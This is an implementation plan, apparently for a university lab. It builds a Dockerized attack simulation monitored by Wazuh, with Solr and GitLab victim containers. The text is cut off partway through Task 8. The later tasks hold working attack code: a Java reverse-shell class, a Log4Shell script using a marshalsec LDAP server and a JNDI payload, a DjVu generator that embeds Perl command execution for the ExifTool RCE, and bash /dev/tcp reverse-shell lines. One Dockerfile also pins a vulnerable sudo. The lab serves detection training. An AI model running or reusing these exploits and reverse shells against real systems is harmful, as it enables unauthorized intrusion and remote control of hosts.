# Pipeline SOC Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build a Dockerized multi-step attack simulation with Wazuh SOC monitoring, detection rules, dashboards, and Teams alerting.

**Architecture:** Flat Docker network with 4 service groups: attacker (Ubuntu + exploit tools), Solr 8.11.0 (Log4Shell victim), GitLab CE 13.10.2 (ExifTool RCE + Baron Samedit victim), and Wazuh single-node (Manager + Indexer + Dashboard). Wazuh agents on both victims forward logs to Manager for detection.

**Tech Stack:** Docker Compose, Wazuh 4.7.5, Apache Solr 8.11.0, GitLab CE 13.10.2, Java (marshalsec), Python3, Bash

---

## Phase 1: Infrastructure

### Task 1: Project scaffolding & Docker Compose

**Files:**
- Create: `docker-compose.yml`
- Create: `.env`
- Create: `.gitignore`

- [ ] **Step 1: Create directory structure**

```bash
cd /home/mate/Uni/soc
mkdir -p attacker/{scripts,payloads,exploits}
mkdir -p solr/config
mkdir -p gitlab/config
mkdir -p wazuh/{config,rules,certs}
```

- [ ] **Step 2: Create `.env`**

```env
# Network
SUBNET=172.20.0.0/24
ATTACKER_IP=172.20.0.10
SOLR_IP=172.20.0.20
GITLAB_IP=172.20.0.30
WAZUH_MANAGER_IP=172.20.0.40
WAZUH_INDEXER_IP=172.20.0.41
WAZUH_DASHBOARD_IP=172.20.0.42

# Wazuh
WAZUH_VERSION=4.7.5
WAZUH_API_USER=wazuh-wui
WAZUH_API_PASS=MyS3cr3tP4ss
WAZUH_CLUSTER_KEY=L2F1dG9nZW5lcmF0ZWRjZXJ0aWZpY2F0ZQ==
WAZUH_INDEXER_PASS=admin
WAZUH_DASHBOARD_PASS=kibanaserver

# GitLab
GITLAB_ROOT_PASSWORD=Passw0rd123

# Attacker
LHOST=172.20.0.10
LPORT=4444

# Teams Webhook (set your actual webhook URL here)
TEAMS_WEBHOOK_URL=https://your-org.webhook.office.com/webhookb2/your-webhook-id
```

- [ ] **Step 3: Create `.gitignore`**

```gitignore
wazuh/certs/*
*.class
*.pyc
__pycache__/
.env.local
```

- [ ] **Step 4: Create `docker-compose.yml`**

```yaml
version: '3.8'

networks:
  soc-net:
    driver: bridge
    ipam:
      config:
        - subnet: ${SUBNET}

services:
  # ── Attacker ──
  attacker:
    build: ./attacker
    container_name: attacker
    hostname: attacker
    stdin_open: true
    tty: true
    networks:
      soc-net:
        ipv4_address: ${ATTACKER_IP}
    volumes:
      - ./attacker/scripts:/opt/scripts
      - ./attacker/payloads:/opt/payloads
      - ./attacker/exploits:/opt/exploits
    depends_on:
      - solr
      - gitlab

  # ── Victim 1: Apache Solr (Log4Shell) ──
  solr:
    build: ./solr
    container_name: solr
    hostname: solr
    networks:
      soc-net:
        ipv4_address: ${SOLR_IP}
    ports:
      - "8983:8983"
    environment:
      - WAZUH_MANAGER=${WAZUH_MANAGER_IP}

  # ── Victim 2: GitLab (ExifTool RCE + Baron Samedit) ──
  gitlab:
    build: ./gitlab
    container_name: gitlab
    hostname: gitlab
    networks:
      soc-net:
        ipv4_address: ${GITLAB_IP}
    ports:
      - "8080:80"
    environment:
      GITLAB_ROOT_PASSWORD: ${GITLAB_ROOT_PASSWORD}
      WAZUH_MANAGER: ${WAZUH_MANAGER_IP}
    shm_size: '256m'

  # ── Wazuh Manager ──
  wazuh-manager:
    image: wazuh/wazuh-manager:${WAZUH_VERSION}
    container_name: wazuh-manager
    hostname: wazuh-manager
    networks:
      soc-net:
        ipv4_address: ${WAZUH_MANAGER_IP}
    ports:
      - "1514:1514"
      - "1515:1515"
      - "55000:55000"
    environment:
      INDEXER_URL: https://${WAZUH_INDEXER_IP}:9200
      INDEXER_USERNAME: admin
      INDEXER_PASSWORD: ${WAZUH_INDEXER_PASS}
      FILEBEAT_SSL_VERIFICATION_MODE: full
      SSL_CERTIFICATE_AUTHORITIES: /etc/ssl/root-ca.pem
      SSL_CERTIFICATE: /etc/ssl/filebeat.pem
      SSL_KEY: /etc/ssl/filebeat-key.pem
      API_USERNAME: ${WAZUH_API_USER}
      API_PASSWORD: ${WAZUH_API_PASS}
    volumes:
      - wazuh-api-config:/var/ossec/api/configuration
      - wazuh-etc:/var/ossec/etc
      - wazuh-logs:/var/ossec/logs
      - wazuh-queue:/var/ossec/queue
      - wazuh-var-multigroups:/var/ossec/var/multigroups
      - wazuh-integrations:/var/ossec/integrations
      - wazuh-active-response:/var/ossec/active-response/bin
      - wazuh-agentless:/var/ossec/agentless
      - wazuh-wodles:/var/ossec/wodles
      - wazuh-filebeat-etc:/etc/filebeat
      - wazuh-filebeat-var:/var/lib/filebeat
      - ./wazuh/certs/root-ca.pem:/etc/ssl/root-ca.pem
      - ./wazuh/certs/wazuh-manager.pem:/etc/ssl/filebeat.pem
      - ./wazuh/certs/wazuh-manager-key.pem:/etc/ssl/filebeat-key.pem
      - ./wazuh/rules/custom_rules.xml:/var/ossec/etc/rules/local_rules.xml
      - ./wazuh/config/ossec.conf:/wazuh-config-mount/etc/ossec.conf

  # ── Wazuh Indexer ──
  wazuh-indexer:
    image: wazuh/wazuh-indexer:${WAZUH_VERSION}
    container_name: wazuh-indexer
    hostname: wazuh-indexer
    networks:
      soc-net:
        ipv4_address: ${WAZUH_INDEXER_IP}
    ports:
      - "9200:9200"
    environment:
      OPENSEARCH_JAVA_OPTS: "-Xms512m -Xmx512m"
    ulimits:
      memlock:
        soft: -1
        hard: -1
      nofile:
        soft: 65536
        hard: 65536
    volumes:
      - wazuh-indexer-data:/var/lib/wazuh-indexer
      - ./wazuh/certs/root-ca.pem:/usr/share/wazuh-indexer/certs/root-ca.pem
      - ./wazuh/certs/wazuh-indexer.pem:/usr/share/wazuh-indexer/certs/wazuh-indexer.pem
      - ./wazuh/certs/wazuh-indexer-key.pem:/usr/share/wazuh-indexer/certs/wazuh-indexer-key.pem
      - ./wazuh/certs/admin.pem:/usr/share/wazuh-indexer/certs/admin.pem
      - ./wazuh/certs/admin-key.pem:/usr/share/wazuh-indexer/certs/admin-key.pem
      - ./wazuh/config/wazuh-indexer.yml:/usr/share/wazuh-indexer/opensearch.yml

  # ── Wazuh Dashboard ──
  wazuh-dashboard:
    image: wazuh/wazuh-dashboard:${WAZUH_VERSION}
    container_name: wazuh-dashboard
    hostname: wazuh-dashboard
    networks:
      soc-net:
        ipv4_address: ${WAZUH_DASHBOARD_IP}
    ports:
      - "443:5601"
    environment:
      INDEXER_USERNAME: admin
      INDEXER_PASSWORD: ${WAZUH_INDEXER_PASS}
      WAZUH_API_URL: https://${WAZUH_MANAGER_IP}
      DASHBOARD_USERNAME: ${WAZUH_API_USER}
      DASHBOARD_PASSWORD: ${WAZUH_API_PASS}
      API_USERNAME: ${WAZUH_API_USER}
      API_PASSWORD: ${WAZUH_API_PASS}
    volumes:
      - ./wazuh/certs/wazuh-dashboard.pem:/usr/share/wazuh-dashboard/certs/wazuh-dashboard.pem
      - ./wazuh/certs/wazuh-dashboard-key.pem:/usr/share/wazuh-dashboard/certs/wazuh-dashboard-key.pem
      - ./wazuh/certs/root-ca.pem:/usr/share/wazuh-dashboard/certs/root-ca.pem
      - ./wazuh/config/wazuh-dashboard.yml:/usr/share/wazuh-dashboard/config/opensearch_dashboards.yml
    depends_on:
      - wazuh-indexer
      - wazuh-manager

volumes:
  wazuh-api-config:
  wazuh-etc:
  wazuh-logs:
  wazuh-queue:
  wazuh-var-multigroups:
  wazuh-integrations:
  wazuh-active-response:
  wazuh-agentless:
  wazuh-wodles:
  wazuh-filebeat-etc:
  wazuh-filebeat-var:
  wazuh-indexer-data:
```

- [ ] **Step 5: Verify compose file syntax**

Run: `cd /home/mate/Uni/soc && docker compose config --quiet`
Expected: no output (valid syntax)

- [ ] **Step 6: Commit**

```bash
git add docker-compose.yml .env .gitignore
git commit -m "feat: add project scaffolding and docker-compose"
```

---

### Task 2: Wazuh stack configuration

**Files:**
- Create: `wazuh/config/ossec.conf`
- Create: `wazuh/config/wazuh-indexer.yml`
- Create: `wazuh/config/wazuh-dashboard.yml`
- Create: `wazuh/rules/custom_rules.xml` (placeholder — filled in Task 11)
- Create: `wazuh/generate-certs.sh`

- [ ] **Step 1: Create `wazuh/config/ossec.conf`**

```xml
<ossec_config>
  <global>
    <jsonout_output>yes</jsonout_output>
    <alerts_log>yes</alerts_log>
    <logall>yes</logall>
    <logall_json>yes</logall_json>
    <email_notification>no</email_notification>
    <smtp_server>localhost</smtp_server>
    <email_from>wazuh@localhost</email_from>
    <email_to>recipient@example.com</email_to>
    <email_maxperhour>12</email_maxperhour>
    <email_log_source>alerts.log</email_log_source>
    <agents_disconnection_time>10m</agents_disconnection_time>
    <agents_disconnection_alert_time>0</agents_disconnection_alert_time>
  </global>

  <alerts>
    <log_alert_level>3</log_alert_level>
    <email_alert_level>12</email_alert_level>
  </alerts>

  <remote>
    <connection>secure</connection>
    <port>1514</port>
    <protocol>tcp</protocol>
    <queue_size>131072</queue_size>
  </remote>

  <auth>
    <disabled>no</disabled>
    <port>1515</port>
    <use_source_ip>no</use_source_ip>
    <purge>yes</purge>
    <use_password>no</use_password>
    <force>
      <enabled>yes</enabled>
      <key_mismatch>yes</key_mismatch>
      <disconnected_time enabled="yes">1h</disconnected_time>
      <after_registration_time>1h</after_registration_time>
    </force>
  </auth>

  <cluster>
    <name>wazuh</name>
    <node_name>wazuh-manager</node_name>
    <node_type>master</node_type>
    <key>L2F1dG9nZW5lcmF0ZWRjZXJ0aWZpY2F0ZQ==</key>
    <port>1516</port>
    <bind_addr>0.0.0.0</bind_addr>
    <nodes>
      <node>wazuh-manager</node>
    </nodes>
    <hidden>no</hidden>
    <disabled>yes</disabled>
  </cluster>

  <ruleset>
    <decoder_dir>ruleset/decoders</decoder_dir>
    <rule_dir>ruleset/rules</rule_dir>
    <rule_exclude>0215-policy_rules.xml</rule_exclude>
    <list>etc/lists/audit-keys</list>
    <list>etc/lists/amazon/aws-eventnames</list>
    <list>etc/lists/security-eventchannel</list>

    <!-- Custom rules -->
    <rule_dir>etc/rules</rule_dir>
  </ruleset>

  <syscheck>
    <disabled>no</disabled>
    <frequency>300</frequency>
    <scan_on_start>yes</scan_on_start>
  </syscheck>

  <vulnerability-detector>
    <enabled>no</enabled>
  </vulnerability-detector>

  <indexer>
    <enabled>yes</enabled>
    <hosts>
      <host>https://wazuh-indexer:9200</host>
    </hosts>
    <ssl>
      <certificate_authorities>
        <ca>/etc/ssl/root-ca.pem</ca>
      </certificate_authorities>
      <certificate>/etc/ssl/filebeat.pem</certificate>
      <key>/etc/ssl/filebeat-key.pem</key>
    </ssl>
  </indexer>
</ossec_config>
```

- [ ] **Step 2: Create `wazuh/config/wazuh-indexer.yml`**

```yaml
network.host: "0.0.0.0"
node.name: "wazuh-indexer"
cluster.initial_master_nodes:
  - "wazuh-indexer"
cluster.name: "wazuh-cluster"

node.max_local_storage_nodes: "3"
path.data: /var/lib/wazuh-indexer
path.logs: /var/log/wazuh-indexer

plugins.security.ssl.http.pemcert_filepath: /usr/share/wazuh-indexer/certs/wazuh-indexer.pem
plugins.security.ssl.http.pemkey_filepath: /usr/share/wazuh-indexer/certs/wazuh-indexer-key.pem
plugins.security.ssl.http.pemtrustedcas_filepath: /usr/share/wazuh-indexer/certs/root-ca.pem
plugins.security.ssl.transport.pemcert_filepath: /usr/share/wazuh-indexer/certs/wazuh-indexer.pem
plugins.security.ssl.transport.pemkey_filepath: /usr/share/wazuh-indexer/certs/wazuh-indexer-key.pem
plugins.security.ssl.transport.pemtrustedcas_filepath: /usr/share/wazuh-indexer/certs/root-ca.pem
plugins.security.ssl.http.enabled: true
plugins.security.ssl.transport.enforce_hostname_verification: false
plugins.security.ssl.transport.resolve_hostname: false

plugins.security.authcz.admin_dn:
  - "CN=admin,OU=Wazuh,O=Wazuh,L=California,C=US"
plugins.security.check_snapshot_restore_write_privileges: true
plugins.security.enable_snapshot_restore_privilege: true
plugins.security.nodes_dn:
  - "CN=wazuh-indexer,OU=Wazuh,O=Wazuh,L=California,C=US"
plugins.security.restapi.roles_enabled:
  - "all_access"
  - "security_rest_api_access"

plugins.security.allow_default_init_securityindex: true
plugins.security.allow_unsafe_democertificates: false

compatibility.override_main_response_version: true
```

- [ ] **Step 3: Create `wazuh/config/wazuh-dashboard.yml`**

```yaml
server.host: 0.0.0.0
server.port: 5601
opensearch.hosts: https://wazuh-indexer:9200
opensearch.ssl.verificationMode: certificate
opensearch.requestHeadersWhitelist: ["securitytenant","Authorization"]
opensearch_security.multitenancy.enabled: false
opensearch_security.readonly_mode.roles: ["kibana_read_only"]
server.ssl.enabled: true
server.ssl.key: "/usr/share/wazuh-dashboard/certs/wazuh-dashboard-key.pem"
server.ssl.certificate: "/usr/share/wazuh-dashboard/certs/wazuh-dashboard.pem"
opensearch.ssl.certificateAuthorities: ["/usr/share/wazuh-dashboard/certs/root-ca.pem"]
opensearch.password: admin
uiSettings.overrides.defaultRoute: /app/wazuh
```

- [ ] **Step 4: Create placeholder `wazuh/rules/custom_rules.xml`**

```xml
<!-- Custom detection rules for pipeline-soc attack chain -->
<group name="local,syslog,">

  <!-- Placeholder: rules added in Task 11 -->

</group>
```

- [ ] **Step 5: Create `wazuh/generate-certs.sh`**

This script generates all SSL certificates needed by the Wazuh stack.

```bash
#!/bin/bash
set -e

CERTS_DIR="$(cd "$(dirname "$0")" && pwd)/certs"
mkdir -p "$CERTS_DIR"

# Generate Root CA
openssl genrsa -out "$CERTS_DIR/root-ca-key.pem" 2048
openssl req -new -x509 -sha256 -key "$CERTS_DIR/root-ca-key.pem" \
  -out "$CERTS_DIR/root-ca.pem" -days 3650 \
  -subj "/C=US/L=California/O=Wazuh/OU=Wazuh/CN=root-ca"

generate_cert() {
  local NAME=$1
  local CN=$2

  # Create extension file for SAN
  cat > "$CERTS_DIR/${NAME}.ext" <<EXTEOF
authorityKeyIdentifier=keyid,issuer
basicConstraints=CA:FALSE
keyUsage = digitalSignature, nonRepudiation, keyEncipherment, dataEncipherment
subjectAltName = @alt_names

[alt_names]
DNS.1 = ${NAME}
DNS.2 = localhost
IP.1 = 127.0.0.1
EXTEOF

  openssl genrsa -out "$CERTS_DIR/${NAME}-key.pem" 2048
  openssl req -new -key "$CERTS_DIR/${NAME}-key.pem" \
    -out "$CERTS_DIR/${NAME}.csr" \
    -subj "/C=US/L=California/O=Wazuh/OU=Wazuh/CN=${CN}"
  openssl x509 -req -in "$CERTS_DIR/${NAME}.csr" \
    -CA "$CERTS_DIR/root-ca.pem" -CAkey "$CERTS_DIR/root-ca-key.pem" \
    -CAcreateserial -out "$CERTS_DIR/${NAME}.pem" -days 3650 -sha256 \
    -extfile "$CERTS_DIR/${NAME}.ext"

  rm -f "$CERTS_DIR/${NAME}.csr" "$CERTS_DIR/${NAME}.ext"
}

generate_cert "wazuh-manager" "wazuh-manager"
generate_cert "wazuh-indexer" "wazuh-indexer"
generate_cert "wazuh-dashboard" "wazuh-dashboard"
generate_cert "admin" "admin"

chmod 400 "$CERTS_DIR"/*-key.pem
chmod 444 "$CERTS_DIR"/*.pem

echo "Certificates generated in $CERTS_DIR"
```

- [ ] **Step 6: Generate certificates**

Run: `cd /home/mate/Uni/soc && chmod +x wazuh/generate-certs.sh && ./wazuh/generate-certs.sh`
Expected: "Certificates generated in .../wazuh/certs"

- [ ] **Step 7: Commit**

```bash
git add wazuh/config/ wazuh/rules/ wazuh/generate-certs.sh
git commit -m "feat: add Wazuh stack configuration and cert generator"
```

---

### Task 3: Solr vulnerable container

**Files:**
- Create: `solr/Dockerfile`
- Create: `solr/entrypoint-wrapper.sh`

- [ ] **Step 1: Create `solr/Dockerfile`**

```dockerfile
FROM solr:8.11.0

USER root

# Install Wazuh agent
RUN apt-get update && \
    apt-get install -y curl apt-transport-https gnupg2 procps && \
    curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --dearmor -o /usr/share/keyrings/wazuh.gpg && \
    echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" > /etc/apt/sources.list.d/wazuh.list && \
    apt-get update && \
    apt-get install -y wazuh-agent=4.7.5-1 && \
    apt-get clean && rm -rf /var/lib/apt/lists/*

# Wazuh agent config will be set at runtime via entrypoint
COPY entrypoint-wrapper.sh /opt/entrypoint-wrapper.sh
RUN chmod +x /opt/entrypoint-wrapper.sh

EXPOSE 8983

ENTRYPOINT ["/opt/entrypoint-wrapper.sh"]
```

- [ ] **Step 2: Create `solr/entrypoint-wrapper.sh`**

```bash
#!/bin/bash

# Configure Wazuh agent to point to manager
if [ -n "$WAZUH_MANAGER" ]; then
  sed -i "s|<address>MANAGER_IP</address>|<address>${WAZUH_MANAGER}</address>|g" /var/ossec/etc/ossec.conf
  # If the placeholder doesn't exist, set it directly
  sed -i "s|<server>|<server>\n      <address>${WAZUH_MANAGER}</address>|g" /var/ossec/etc/ossec.conf 2>/dev/null || true

  # Configure agent to monitor Solr logs
  cat >> /var/ossec/etc/ossec.conf <<'AGENTEOF'
<ossec_config>
  <localfile>
    <log_format>syslog</log_format>
    <location>/var/solr/logs/solr.log</location>
  </localfile>
</ossec_config>
AGENTEOF

  # Start Wazuh agent
  /var/ossec/bin/wazuh-control start &
fi

# Start Solr as the solr user
exec gosu solr solr-foreground
```

- [ ] **Step 3: Build and verify**

Run: `cd /home/mate/Uni/soc && docker compose build solr`
Expected: successful build

- [ ] **Step 4: Commit**

```bash
git add solr/
git commit -m "feat: add Solr 8.11.0 container with Wazuh agent"
```

---

### Task 4: GitLab vulnerable container with vulnerable sudo

**Files:**
- Create: `gitlab/Dockerfile`
- Create: `gitlab/entrypoint-wrapper.sh`

- [ ] **Step 1: Create `gitlab/Dockerfile`**

```dockerfile
FROM gitlab/gitlab-ce:13.10.2-ce.0

# Install vulnerable sudo (Baron Samedit: CVE-2021-3156)
# GitLab 13.10.2 is Ubuntu 16.04 based
# We need sudo < 1.8.32 (unpatched)
# First remove current sudo, then install vulnerable version
RUN apt-get update && \
    apt-get install -y wget gnupg2 && \
    # Download and install a known-vulnerable sudo package
    # Ubuntu 16.04 shipped with sudo 1.8.16 which is vulnerable
    # Pin it to prevent upgrades
    apt-mark hold sudo && \
    apt-get clean && rm -rf /var/lib/apt/lists/*

# Verify sudo is vulnerable: version should be < 1.8.32
RUN sudo --version | head -1

# Install Wazuh agent
RUN curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --dearmor -o /usr/share/keyrings/wazuh.gpg && \
    echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" > /etc/apt/sources.list.d/wazuh.list && \
    apt-get update && \
    apt-get install -y wazuh-agent=4.7.5-1 && \
    apt-get clean && rm -rf /var/lib/apt/lists/*

COPY entrypoint-wrapper.sh /opt/entrypoint-wrapper.sh
RUN chmod +x /opt/entrypoint-wrapper.sh

# GitLab default ports
EXPOSE 80 443 22

ENTRYPOINT ["/opt/entrypoint-wrapper.sh"]
```

- [ ] **Step 2: Create `gitlab/entrypoint-wrapper.sh`**

```bash
#!/bin/bash

# Configure Wazuh agent
if [ -n "$WAZUH_MANAGER" ]; then
  sed -i "s|<address>MANAGER_IP</address>|<address>${WAZUH_MANAGER}</address>|g" /var/ossec/etc/ossec.conf
  sed -i "s|<server>|<server>\n      <address>${WAZUH_MANAGER}</address>|g" /var/ossec/etc/ossec.conf 2>/dev/null || true

  # Monitor GitLab logs and auth logs
  cat >> /var/ossec/etc/ossec.conf <<'AGENTEOF'
<ossec_config>
  <localfile>
    <log_format>syslog</log_format>
    <location>/var/log/gitlab/gitlab-rails/production.log</location>
  </localfile>
  <localfile>
    <log_format>syslog</log_format>
    <location>/var/log/auth.log</location>
  </localfile>
  <localfile>
    <log_format>syslog</log_format>
    <location>/var/log/syslog</location>
  </localfile>
  <syscheck>
    <directories check_all="yes" realtime="yes">/root/.ssh,/var/spool/cron,/etc/crontab</directories>
  </syscheck>
</ossec_config>
AGENTEOF

  /var/ossec/bin/wazuh-control start &
fi

# Run the original GitLab entrypoint
exec /assets/wrapper
```

- [ ] **Step 3: Build and verify**

Run: `cd /home/mate/Uni/soc && docker compose build gitlab`
Expected: successful build, `sudo --version` output showing version < 1.8.32

- [ ] **Step 4: Commit**

```bash
git add gitlab/
git commit -m "feat: add GitLab 13.10.2 container with vulnerable sudo and Wazuh agent"
```

---

### Task 5: Attacker container

**Files:**
- Create: `attacker/Dockerfile`

- [ ] **Step 1: Create `attacker/Dockerfile`**

```dockerfile
FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y \
    python3 \
    python3-pip \
    curl \
    wget \
    netcat-openbsd \
    nmap \
    ssh \
    git \
    openjdk-11-jdk \
    maven \
    build-essential \
    jq \
    vim \
    && apt-get clean && rm -rf /var/lib/apt/lists/*

# Build marshalsec (LDAP server for Log4Shell)
RUN cd /opt && \
    git clone https://github.com/mbechler/marshalsec.git && \
    cd marshalsec && \
    mvn clean package -DskipTests -q

# Generate SSH key for persistence phase
RUN ssh-keygen -t rsa -b 4096 -f /root/.ssh/id_rsa -N "" -q

WORKDIR /opt

CMD ["/bin/bash"]
```

- [ ] **Step 2: Build and verify**

Run: `cd /home/mate/Uni/soc && docker compose build attacker`
Expected: successful build, marshalsec jar built

- [ ] **Step 3: Commit**

```bash
git add attacker/Dockerfile
git commit -m "feat: add attacker container with exploit tools"
```

---

### Task 6: Bring up infrastructure & verify

- [ ] **Step 1: Generate Wazuh certs if not done**

Run: `cd /home/mate/Uni/soc && ./wazuh/generate-certs.sh`

- [ ] **Step 2: Start all containers**

Run: `cd /home/mate/Uni/soc && docker compose up -d`
Expected: all containers start (GitLab will take 2-3 minutes to initialize)

- [ ] **Step 3: Verify Solr is running**

Run: `curl -s http://localhost:8983/solr/admin/cores | head -5`
Expected: JSON response from Solr admin API

- [ ] **Step 4: Verify GitLab is running**

Run: `curl -s -o /dev/null -w "%{http_code}" http://localhost:8080/users/sign_in`
Expected: `200` (may take a few minutes after startup)

- [ ] **Step 5: Verify Wazuh Dashboard is running**

Run: `curl -sk https://localhost:443/app/login | head -5`
Expected: HTML response from Wazuh Dashboard

- [ ] **Step 6: Verify Wazuh Manager API**

Run: `curl -sk -u wazuh-wui:MyS3cr3tP4ss https://localhost:55000/?pretty`
Expected: JSON with Wazuh API version info

- [ ] **Step 7: Verify attacker can reach victims**

Run: `docker exec attacker bash -c "curl -s http://172.20.0.20:8983/ && echo 'SOLR OK' && curl -s http://172.20.0.30/ && echo 'GITLAB OK'"`
Expected: responses from both services

- [ ] **Step 8: Verify Wazuh agents connected**

Run: `curl -sk -u wazuh-wui:MyS3cr3tP4ss https://localhost:55000/agents?pretty`
Expected: JSON listing solr and gitlab agents

**Note:** If agents are not registered, check logs: `docker exec wazuh-manager cat /var/ossec/logs/ossec.log | tail -20`

---

## Phase 2: Attack Scripts

### Task 7: Log4Shell attack (01-log4shell.sh)

**Files:**
- Create: `attacker/payloads/Evil.java`
- Create: `attacker/scripts/01-log4shell.sh`

- [ ] **Step 1: Create `attacker/payloads/Evil.java`**

This Java class opens a reverse shell back to the attacker when executed.

```java
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Evil {
    static {
        try {
            String host = System.getenv("LHOST") != null ? System.getenv("LHOST") : "172.20.0.10";
            int port = System.getenv("LPORT") != null ? Integer.parseInt(System.getenv("LPORT")) : 4444;
            Socket s = new Socket(host, port);
            Process p = new ProcessBuilder("/bin/bash", "-i")
                .redirectErrorStream(true)
                .start();
            InputStream pi = p.getInputStream();
            OutputStream po = p.getOutputStream();
            InputStream si = s.getInputStream();
            OutputStream so = s.getOutputStream();
            Thread t1 = new Thread(() -> {
                try {
                    byte[] buf = new byte[1024];
                    int len;
                    while ((len = pi.read(buf)) != -1) so.write(buf, 0, len);
                } catch (IOException ignored) {}
            });
            Thread t2 = new Thread(() -> {
                try {
                    byte[] buf = new byte[1024];
                    int len;
                    while ((len = si.read(buf)) != -1) { po.write(buf, 0, len); po.flush(); }
                } catch (IOException ignored) {}
            });
            t1.start();
            t2.start();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

- [ ] **Step 2: Create `attacker/scripts/01-log4shell.sh`**

```bash
#!/bin/bash
# Log4Shell (CVE-2021-44228) exploit against Apache Solr 8.11.0
# Usage: ./01-log4shell.sh [SOLR_HOST] [LHOST] [LPORT]

set -e

SOLR_HOST="${1:-172.20.0.20}"
SOLR_PORT=8983
LHOST="${2:-172.20.0.10}"
LPORT="${3:-4444}"
LDAP_PORT=1389
HTTP_PORT=8888

PAYLOAD_DIR="/opt/payloads"
MARSHALSEC_JAR="/opt/marshalsec/target/marshalsec-0.0.3-SNAPSHOT-all.jar"

echo "[*] Log4Shell exploit (CVE-2021-44228)"
echo "[*] Target: ${SOLR_HOST}:${SOLR_PORT}"
echo "[*] Callback: ${LHOST}:${LPORT}"
echo ""

# Step 1: Compile the malicious Java class
echo "[1/4] Compiling Evil.java..."
cd "$PAYLOAD_DIR"
LHOST="$LHOST" LPORT="$LPORT" javac Evil.java
echo "      Evil.class ready"

# Step 2: Start HTTP server to serve the .class file
echo "[2/4] Starting HTTP server on port ${HTTP_PORT}..."
cd "$PAYLOAD_DIR"
python3 -m http.server "$HTTP_PORT" &
HTTP_PID=$!
sleep 1
echo "      HTTP server PID: ${HTTP_PID}"

# Step 3: Start marshalsec LDAP server
echo "[3/4] Starting LDAP redirect server on port ${LDAP_PORT}..."
java -cp "$MARSHALSEC_JAR" marshalsec.jndi.LDAPRefServer "http://${LHOST}:${HTTP_PORT}/#Evil" "$LDAP_PORT" &
LDAP_PID=$!
sleep 2
echo "      LDAP server PID: ${LDAP_PID}"

# Step 4: Send the JNDI payload to Solr
echo "[4/4] Sending JNDI payload to Solr..."
echo ""
echo "      Payload: \${jndi:ldap://${LHOST}:${LDAP_PORT}/Evil}"
echo ""

# Solr logs query parameters — this triggers Log4j evaluation
PAYLOAD="\${jndi:ldap://${LHOST}:${LDAP_PORT}/Evil}"
curl -s "http://${SOLR_HOST}:${SOLR_PORT}/solr/admin/cores?action=${PAYLOAD}" -o /dev/null || true

echo ""
echo "[*] Payload sent! If successful, reverse shell connects to ${LHOST}:${LPORT}"
echo "[*] Start listener with: nc -lvnp ${LPORT}"
echo ""
echo "[*] Press Ctrl+C to stop LDAP and HTTP servers"

# Cleanup on exit
trap "kill $HTTP_PID $LDAP_PID 2>/dev/null; echo '[*] Servers stopped'" EXIT
wait
```

- [ ] **Step 3: Make script executable**

Run: `chmod +x /home/mate/Uni/soc/attacker/scripts/01-log4shell.sh`

- [ ] **Step 4: Commit**

```bash
git add attacker/payloads/Evil.java attacker/scripts/01-log4shell.sh
git commit -m "feat: add Log4Shell exploit script and payload"
```

---

### Task 8: ExifTool RCE attack (02-exiftool-rce.sh)

**Files:**
- Create: `attacker/payloads/gen_payload_image.py`
- Create: `attacker/scripts/02-exiftool-rce.sh`

- [ ] **Step 1: Create `attacker/payloads/gen_payload_image.py`**

This script generates a malicious DjVu file that exploits CVE-2021-22204 (the underlying ExifTool bug that CVE-2021-22205 triggers via GitLab).

```python
#!/usr/bin/env python3
"""
Generate a malicious image exploiting CVE-2021-22205 (GitLab ExifTool RCE).
The payload is embedded in DjVu annotation metadata that ExifTool evaluates.
"""
import struct
import sys
import os

def create_djvu_payload(command: str) -> bytes:
    """Create a DjVu file with an embedded command in metadata."""
    # The exploit abuses ExifTool's DjVu metadata parser
    # ExifTool evaluates Perl code in DjVu annotation chunks
    payload = f'(metadata\n(Copyright "\\\n" . qx{{{command}}} . ""))'
    payload_bytes = payload.encode()

    # DjVu file structure
    # AT&T magic + FORM header
    djvu = b"AT&TFORM"
    # We'll calculate total size after building content
    content = b"DJVUINFO"
    # Minimal INFO chunk (10 bytes)
    info_data = struct.pack('>HH', 100, 100)  # width, height
    info_data += b'\x18'  # 24 bpp
    info_data += b'\x00' * 5  # padding
    content += struct.pack('>I', len(info_data)) + info_data
    if len(info_data) % 2:
        content += b'\x00'

    # ANTa chunk with the payload
    content += b"ANTa"
    content += struct.pack('>I', len(payload_bytes))
    content += payload_bytes
    if len(payload_bytes) % 2:
        content += b'\x00'

    djvu += struct.pack('>I', len(content))
    djvu += content

    return djvu


def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <command> <output_file>")
        print(f"Example: {sys.argv[0]} 'bash -c \"bash -i >& /dev/tcp/172.20.0.10/4444 0>&1\"' payload.jpg")
        sys.exit(1)

    command = sys.argv[1]
    output_file = sys.argv[2]

    djvu_data = create_djvu_payload(command)

    with open(output_file, 'wb') as f:
        f.write(djvu_data)

    print(f"[+] Payload image written to {output_file} ({len(djvu_data)} bytes)")
    print(f"[+] Embedded command: {command}")


if __name__ == '__main__':
    main()
```

- [ ] **Step 2: Create `attacker/scripts/02-exiftool-rce.sh`**

```bash
#!/bin/bash
# GitLab ExifTool RCE (CVE-2021-22205)
# Usage: ./02-exiftool-rce.sh [GITLAB_HOST] [LHOST] [LPORT]

set -e

GITLAB_HOST="${1:-172.20.0.30}"
GITLAB_PORT=80
LHOST="${2:-172.20.0.10}"
LPORT="${3:-4445}"

PAYLOAD_DIR="/opt/payloads"
PAYLOAD_IMAGE="/tmp/exploit.jpg"

echo "[*] GitLab ExifTool RCE (CVE-2021-22205)"
echo "[*] Target: ${GITLAB_HOST}:${GITLAB_PORT}"
echo "[*] Callback: ${LHOST}:${LPORT}"
echo ""

# Step 1: Generate the malicious image
echo "[1/2] Generating malicious DjVu payload image..."
REVERSE_SHELL="bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1'"
